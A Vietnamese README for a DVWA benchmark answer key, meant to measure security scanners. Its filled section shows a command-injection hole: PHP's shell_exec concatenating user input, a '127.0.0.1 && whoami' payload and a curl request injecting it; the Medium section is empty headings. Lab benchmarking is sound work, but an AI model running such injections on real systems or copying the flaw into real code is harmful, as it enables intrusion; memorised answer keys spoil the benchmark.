# DV-baseline

Tài liệu này (**"DV-Baseline"**) được xây dựng nhằm mục đích thiết lập một **"Ground Truth" (Sự thật nền)** chi tiết, có thể kiểm chứng và định lượng được cho ứng dụng Damn Vulnerable Web Application (DVWA).

Mục tiêu chính là cung cấp một bộ dữ liệu tham chiếu (*benchmark dataset*) chuẩn hóa để đo lường, so sánh và xác thực hiệu suất của các công cụ quét bảo mật ứng dụng động (DAST) và các giải pháp phân tích bảo mật tự động khác.  
Tài liệu này đóng vai trò là **"bảng đáp án"** để đánh giá:

- **Độ phủ (Coverage):** Khả năng phát hiện các lỗ hổng ở các mức độ phức tạp khác nhau (*Low, Medium, High*).

- **Độ chính xác (Accuracy):** Khả năng phân biệt giữa lỗ hổng thực sự (*True Positive*) và các báo động giả (*False Positive*) bằng cách phân tích cấp độ *"Impossible"*.  

- **Độ sâu (Depth):** Khả năng vượt qua (*bypass*) các cơ chế phòng vệ (*filter*) cơ bản và nâng cao của công cụ.

# Command Injection - OWSAP Injection
## Security level: low
### Method 

-   Phân tích mã nguồn cho thấy `parameter` 'ip' được truyền trực tiếp vào `shell_exec()` mà không qua bất kỳ bộ lọc nào.

### Mã nguồn gây lỗi (Vulnerable Code):

```
$cmd = shell_exec( 'ping  -c 4 ' . $target );
```
### Các bước khai thác (Proof of Concept):

- **Payload:**  
```bash
127.0.0.1 && whoami
```

- **Lệnh `curl`:**  
```bash
curl -X POST 'http://[DVWA_IP]/vulnerabilities/exec/' \
     -b 'security=low; PHPSESSID=[YOUR_SESSION_ID]' \
     -d 'ip=127.0.0.1 && whoami&submit=Submit'
```

- **Kết quả mong đợi:**  
Trang web trả về kết quả của lệnh `whoami` (ví dụ: `www-data`).
### Screenshots

<img width="2559" height="1335" alt="image" src="https://github.com/user-attachments/assets/b001397c-d73f-40af-a211-0b7a1e1088c1" />

## Security level: Medium
### Method 
### Mã nguồn gây lỗi (Vulnerable Code)
### Các bước khai thác (Proof of Concept)
### Screenshots
### Mô tả



